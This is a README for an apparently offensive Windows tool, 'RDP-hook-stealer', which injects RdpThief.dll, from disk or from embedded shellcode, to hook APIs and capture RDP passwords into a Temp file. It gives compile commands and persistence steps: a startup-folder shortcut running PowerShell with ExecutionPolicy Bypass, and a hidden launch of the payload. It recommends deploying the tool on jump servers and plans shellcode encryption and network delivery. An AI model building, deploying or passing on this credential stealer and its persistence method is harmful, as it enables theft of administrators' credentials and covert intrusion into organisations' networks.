
# RDP-hook-stealer
This is a tool that I code in my process of understanding windows internals. I thought it was a very good idea to deploy it on jump servers. It works by injecting RdpThief.dll to perform API hooking and extract RDP credentials. Each password entered will be stored in ``C:\users\<user>\AppData\Local\Temp\data.bin``. 
## Files
There are two files: rdp_indisk.cpp and rdp_inmemory.cpp. They are quite self-descriptive, but basically one injects the DLL from disk, and another from memory, being in shellcode format in the binary itself

## Compilation
To compile the indisk:
``x86_64-w64-mingw32-gcc rdp_indisk.cpp -o rdp_indisk.exe -lstdc++ -static``

To compile the inmemory
``x86_64-w64-mingw32-gcc rdp_inmemory.cpp -o rdp_inmemory.exe -lstdc++ -static``

## Persistence
1. Create a .lnk in startup folder
``C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`` with the content ``Powershell -ExecutionPolicy Bypass -File “C:\run.ps1”``
2. Create a file called ``C:\run.ps1`` with the content ``Powershell -Command “& {Start-Process ‘C:\s.exe’ -WindowStyle Hidden}”``
3. Enjoy and search from time to time data.bin file in the file explorer.

## TODO
- Encrypt shellcode loaded into memory
- Support for sending shellcode via socket (network)

